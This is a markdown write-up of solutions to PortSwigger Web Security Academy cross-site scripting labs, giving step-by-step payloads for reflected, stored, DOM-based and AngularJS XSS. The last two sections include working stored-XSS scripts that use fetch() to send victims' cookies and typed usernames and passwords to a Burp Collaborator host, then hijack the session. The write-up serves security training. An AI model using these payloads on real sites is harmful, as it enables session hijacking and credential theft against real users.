<!-- omit in toc -->
# XSS

<!-- omit in toc -->
## Table of Contents

- [Reflected XSS into HTML context with nothing encoded](#reflected-xss-into-html-context-with-nothing-encoded)
- [Stored XSS into HTML context with nothing encoded](#stored-xss-into-html-context-with-nothing-encoded)
- [DOM XSS in document.write sink using source location.search](#dom-xss-in-documentwrite-sink-using-source-locationsearch)
- [DOM XSS in document.write sink using source location.search inside a select element](#dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element)
- [DOM XSS in innerHTML sink using source location.search](#dom-xss-in-innerhtml-sink-using-source-locationsearch)
- [DOM XSS in jQuery anchor href attribute sink using location.search source](#dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source)
- [DOM XSS in jQuery selector sink using a hashchange event](#dom-xss-in-jquery-selector-sink-using-a-hashchange-event)
- [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](#dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded)
- [Reflected DOM XSS](#reflected-dom-xss)
- [Stored DOM XSS](#stored-dom-xss)
- [Exploiting cross-site scripting to steal cookies](#exploiting-cross-site-scripting-to-steal-cookies)
- [Exploiting cross-site scripting to capture passwords](#exploiting-cross-site-scripting-to-capture-passwords)

## Reflected XSS into HTML context with nothing encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

<!-- omit in toc -->
### Solution
1. Copy and paste the following into the search box: ``<script>alert(1)</script>``
2. Click "Search".

## Stored XSS into HTML context with nothing encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

<!-- omit in toc -->
### Quick Solution
Although this is an **extremely** easy lab to complete I also tried a tool called ``dalfox`` that is able to perform Store XSS assessments. The command I used is the following (on version 2.5.5):
```
dalfox sxss -X POST "<target_url>/post/comment" -d "csrf=<crsf_token>&postId=2&comment=thelicato&name=thelicato&email=the@lica.to&website=" -p "comment" --cookie="session=<session_cookie>" --trigger "<target_url>/post?postId=2" --request-method GET -w 1
```
The requests can also be proxied to Burp by adding ``--proxy <proxy_url>``

<!-- omit in toc -->
### Solution
1. Enter the following into the comment box: ``<script>alert(1)</script>``
2. Enter a name, email and website.
3. Click "Post comment".
4. Go back to the blog.

## DOM XSS in document.write sink using source location.search
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

<!-- omit in toc -->
### Solution
1. Enter a random alphanumeric string into the search box.
2. Right-click and inspect the element, and observe that your random string has been placed inside an ``img src`` attribute.
3. Break out of the img attribute by searching for: ``"><svg onload=alert(1)>``

## DOM XSS in document.write sink using source location.search inside a select element
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

<!-- omit in toc -->
### Quick Solution
The lab description says that there is a vulnerability in the stock checker functionality. The ``document.write`` function is called with data from ``location.search`` that extracts a ``storeId`` parameter. Adding it to the URL can trigger the vulnerability:
```
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

<!-- omit in toc -->
### Solution
1. On the product pages, notice that the dangerous JavaScript extracts a ``storeId`` parameter from the ``location.search`` source. It then uses ``document.write`` to create a new option in the select element for the stock checker functionality.
2. Add a ``storeId`` query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.
3. In your browser, notice that your random string is now listed as one of the options in the drop-down list.
4. Right-click and inspect the drop-down list to confirm that the value of your ``storeId`` parameter has been placed inside a select element.
5. Change the URL to include a suitable XSS payload inside the ``storeId`` parameter as follows:
```
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

## DOM XSS in innerHTML sink using source location.search
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

<!-- omit in toc -->
### Solution
1. Enter the following into the into the search box: ``<img src=1 onerror=alert(1)>``
2. Click "Search".
The value of the ``src`` attribute is invalid and throws an error. This triggers the ``onerror`` event handler, which then calls the ``alert()`` function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post.

## DOM XSS in jQuery anchor href attribute sink using location.search source
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

<!-- omit in toc -->
### Solution
1. On the Submit feedback page, change the query parameter `returnPath` to / followed by a random alphanumeric string.
2. Right-click and inspect the element, and observe that your random string has been placed inside an a ``href`` attribute.
3. Change ``returnPath`` to ``javascript:alert(document.cookie)``, then hit enter and click "back".

## DOM XSS in jQuery selector sink using a hashchange event
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

<!-- omit in toc -->
### Solution
1. Notice the vulnerable code on the home page using Burp or your browser's DevTools.
2. From the lab banner, open the exploit server.
3. In the **Body** section, add the following malicious `iframe`:
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
4. Store the exploit, then click **View exploit** to confirm that the ``print()`` function is called.
Go back to the exploit server and click **Deliver to victim** to solve the lab.

## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

<!-- omit in toc -->
## Quick Solution
Detect that *AngularJS* is used on the website. Then you can simply test different XSS payloads for AngularJS. This is an interesting source for them: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md

A payload that works is the following:
```
{{constructor.constructor('alert(1)')()}}
```

<!-- omit in toc -->
### Solution
1. Enter a random alphanumeric string into the search box.
2. View the page source and observe that your random string is enclosed in an ``ng-app`` directive.
3. Enter the following AngularJS expression in the search box:
```
{{$on.constructor('alert(1)')()}}
```
4. Click search

## Reflected DOM XSS
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

<!-- omit in toc -->
### Quick Solution
The website uses a JavaScript file to display search results (``searchResults.js``). To break the code enter the following term:
```
\"-alert(1)}//
```

<!-- omit in toc -->
### Solution
1. In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.
2. Back in the lab, go to the target website and use the search bar to search for a random test string, such as "XSS".
3. Return to the Proxy tool in Burp Suite and forward the request.
4. On the Intercept tab, notice that the string is reflected in a JSON response called ``search-results``.
5. From the Site Map, open the ``searchResults.js`` file and notice that the JSON response is used with an ``eval()`` function call.
6. By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.
7. To solve this lab, enter the following search term: ``\"-alert(1)}//``
As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.

An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the ``alert()`` function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:
```
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```

## Stored DOM XSS
Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

<!-- omit in toc -->
### Solution
Post a comment containing the following vector:
```
<><img src=1 onerror=alert(1)>
```

In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.

## Exploiting cross-site scripting to steal cookies
Reference: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

<!-- omit in toc -->
### Quick Solution
There is a stored XSS in the comments, just add a ``fetch`` to the Burp Collaborator to get the ``cookie`` of the victim. Payload in the next section.

<!-- omit in toc -->
### Solution
1. Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
```javascript
<script>
    fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
</script>
```
This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their cookie.
4. Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's cookie in the POST body.
6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page.

## Exploiting cross-site scripting to capture passwords
Reference: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

<!-- omit in toc -->
### Quick Solution
Exploit an XSS vulnerability in the comments to make anyone who views the comment to issue a POST request to the Burp Collaborator containing their username and password. Payload in the next section.

<!-- omit in toc -->
### Solution
1. Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their username and password.
4. Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction.If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's username and password in the POST body.
6. Use the credentials to log in as the victim user.